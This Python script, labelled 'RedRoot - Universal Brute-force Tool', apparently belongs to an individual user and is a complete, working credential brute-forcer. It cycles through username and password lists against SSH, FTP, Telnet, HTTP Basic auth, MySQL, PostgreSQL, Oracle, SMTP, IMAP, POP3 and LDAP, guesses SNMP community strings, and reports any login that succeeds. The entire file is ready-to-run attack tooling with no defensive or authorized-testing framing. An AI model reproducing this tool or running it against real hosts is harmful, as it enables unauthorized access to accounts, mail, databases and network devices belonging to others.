#!/usr/bin/env python3
import argparse
import os
import time
from rich.console import Console
from rich.text import Text
from rich.table import Table
import ftplib, paramiko, requests, pymysql, smtplib, imaplib, poplib, psycopg2
from ldap3 import Server, Connection, ALL
from pysnmp.hlapi import *
import cx_Oracle
import pexpect

console = Console()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def animate_typing_banner():
    clear()
    msg = "Welcome Mr. Agampreet"
    colors = ["red", "gold1"]
    text = Text()
    for i, char in enumerate(msg):
        text.append(char, style=f"bold {colors[i % 2]}")
        console.print(text, end="\r")
        time.sleep(0.02)
    console.print()
    time.sleep(0.2)

def load_list(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def log_result(success, service, user, pwd):
    color = "green" if success else "red"
    tag = "[+]" if success else "[-]"
    console.print(f"{tag} {service} {'Success' if success else 'Fail'}: [bold yellow]{user}[/bold yellow]:[bold yellow]{pwd}[/bold yellow]", style=f"bold {color}")

# === Bruteforce Functions ===

def brute_http_basic(url, users, passwords):
    for user in users:
        for pwd in passwords:
            try:
                r = requests.get(url, auth=(user, pwd), timeout=5)
                log_result(r.status_code == 200, "HTTP", user, pwd)
                if r.status_code == 200:
                    return
            except Exception as e:
                console.print(f"[!] HTTP Error: {e}", style="bold red")
                return

def brute_ftp(host, port, users, passwords):
    for user in users:
        for pwd in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(user, pwd)
                log_result(True, "FTP", user, pwd)
                ftp.quit()
                return
            except ftplib.error_perm:
                log_result(False, "FTP", user, pwd)
            except Exception as e:
                console.print(f"[!] FTP Error: {e}", style="bold red")
                return

def brute_ssh(host, port, users, passwords):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in users:
        for pwd in passwords:
            try:
                ssh.connect(host, port=port, username=user, password=pwd, timeout=5)
                log_result(True, "SSH", user, pwd)
                ssh.close()
                return
            except paramiko.AuthenticationException:
                log_result(False, "SSH", user, pwd)
            except Exception as e:
                console.print(f"[!] SSH Error: {e}", style="bold red")
                return

def brute_telnet_pexpect(host, port, users, passwords):
    for user in users:
        for pwd in passwords:
            try:
                child = pexpect.spawn(f"telnet {host} {port}", timeout=5)
                child.expect("login:")
                child.sendline(user)
                child.expect("Password:")
                child.sendline(pwd)
                index = child.expect(["#", r"\$", "Login incorrect"], timeout=5)
                success = index in [0, 1]
                log_result(success, "Telnet", user, pwd)
                child.close()
                if success:
                    return
            except Exception as e:
                console.print(f"[!] Telnet Error: {e}", style="bold red")
                return

def brute_mysql(host, port, users, passwords):
    for user in users:
        for pwd in passwords:
            try:
                conn = pymysql.connect(host=host, port=port, user=user, password=pwd, connect_timeout=5)
                log_result(True, "MySQL", user, pwd)
                conn.close()
                return
            except pymysql.err.OperationalError:
                log_result(False, "MySQL", user, pwd)
            except Exception as e:
                console.print(f"[!] MySQL Error: {e}", style="bold red")
                return

def brute_postgresql(host, port, users, passwords):
    for user in users:
        for pwd in passwords:
            try:
                conn = psycopg2.connect(host=host, port=port, user=user, password=pwd, connect_timeout=5)
                log_result(True, "PostgreSQL", user, pwd)
                conn.close()
                return
            except psycopg2.OperationalError:
                log_result(False, "PostgreSQL", user, pwd)
            except Exception as e:
                console.print(f"[!] PostgreSQL Error: {e}", style="bold red")
                return

def brute_oracle(host, port, users, passwords):
    dsn = cx_Oracle.makedsn(host, port, service_name="ORCL")
    for user in users:
        for pwd in passwords:
            try:
                conn = cx_Oracle.connect(user=user, password=pwd, dsn=dsn)
                log_result(True, "Oracle", user, pwd)
                conn.close()
                return
            except cx_Oracle.DatabaseError:
                log_result(False, "Oracle", user, pwd)
            except Exception as e:
                console.print(f"[!] Oracle Error: {e}", style="bold red")
                return

def brute_smtp(host, port, users, passwords):
    for user in users:
        for pwd in passwords:
            try:
                server = smtplib.SMTP(host, port, timeout=5)
                server.starttls()
                server.login(user, pwd)
                log_result(True, "SMTP", user, pwd)
                server.quit()
                return
            except smtplib.SMTPAuthenticationError:
                log_result(False, "SMTP", user, pwd)
            except Exception as e:
                console.print(f"[!] SMTP Error: {e}", style="bold red")
                return

def brute_imap(host, port, users, passwords):
    for user in users:
        for pwd in passwords:
            try:
                conn = imaplib.IMAP4_SSL(host, port)
                conn.login(user, pwd)
                log_result(True, "IMAP", user, pwd)
                conn.logout()
                return
            except imaplib.IMAP4.error:
                log_result(False, "IMAP", user, pwd)
            except Exception as e:
                console.print(f"[!] IMAP Error: {e}", style="bold red")
                return

def brute_pop3(host, port, users, passwords):
    for user in users:
        for pwd in passwords:
            try:
                conn = poplib.POP3_SSL(host, port, timeout=5)
                conn.user(user)
                conn.pass_(pwd)
                log_result(True, "POP3", user, pwd)
                conn.quit()
                return
            except poplib.error_proto:
                log_result(False, "POP3", user, pwd)
            except Exception as e:
                console.print(f"[!] POP3 Error: {e}", style="bold red")
                return

def brute_ldap(host, port, users, passwords):
    server = Server(host, port=port, get_info=ALL)
    for user in users:
        for pwd in passwords:
            try:
                conn = Connection(server, user=user, password=pwd)
                if conn.bind():
                    log_result(True, "LDAP", user, pwd)
                    conn.unbind()
                    return
                else:
                    log_result(False, "LDAP", user, pwd)
            except Exception as e:
                console.print(f"[!] LDAP Error: {e}", style="bold red")
                return

def brute_snmp(host, community_list):
    for community in community_list:
        iterator = getCmd(SnmpEngine(), CommunityData(community, mpModel=0),
                          UdpTransportTarget((host, 161)), ContextData(),
                          ObjectType(ObjectIdentity('1.3.6.1.2.1.1.1.0')))
        errorIndication, errorStatus, errorIndex, varBinds = next(iterator)
        if not errorIndication and not errorStatus:
            console.print(f"[+] SNMP Success: Community=[bold yellow]{community}[/bold yellow]", style="bold green")
            return
        else:
            console.print(f"[-] SNMP Fail: Community=[bold yellow]{community}[/bold yellow]", style="bold red")

# === Main Runner ===

def run_bruteforce():
    animate_typing_banner()

    parser = argparse.ArgumentParser(description="RedRoot - Universal Brute-force Tool", epilog="Example: python redrootbf.py --service ssh --host 192.168.1.1 --users users.txt --passwords passwords.txt")
    parser.add_argument("--service", required=True, help="Target service name")
    parser.add_argument("--host", required=True, help="Target host")
    parser.add_argument("--port", type=int, help="Port if different from default")
    parser.add_argument("--url", help="HTTP URL (for HTTP Basic Auth only)")
    parser.add_argument("--users", help="Username file path")
    parser.add_argument("--passwords", help="Password file path")

    args = parser.parse_args()
    service = args.service.lower()

    if service == "snmp":
        brute_snmp(args.host, load_list(args.passwords))
        return

    users = load_list(args.users)
    passwords = load_list(args.passwords)

    match service:
        case "http":
            brute_http_basic(args.url, users, passwords)
        case "ftp":
            brute_ftp(args.host, args.port or 21, users, passwords)
        case "ssh":
            brute_ssh(args.host, args.port or 22, users, passwords)
        case "telnet":
            brute_telnet_pexpect(args.host, args.port or 23, users, passwords)
        case "mysql":
            brute_mysql(args.host, args.port or 3306, users, passwords)
        case "postgresql":
            brute_postgresql(args.host, args.port or 5432, users, passwords)
        case "oracle":
            brute_oracle(args.host, args.port or 1521, users, passwords)
        case "smtp":
            brute_smtp(args.host, args.port or 587, users, passwords)
        case "imap":
            brute_imap(args.host, args.port or 993, users, passwords)
        case "pop3":
            brute_pop3(args.host, args.port or 995, users, passwords)
        case "ldap":
            brute_ldap(args.host, args.port or 389, users, passwords)
        case _:
            console.print("[-] Unsupported service", style="bold red")

if __name__ == "__main__":
    run_bruteforce()
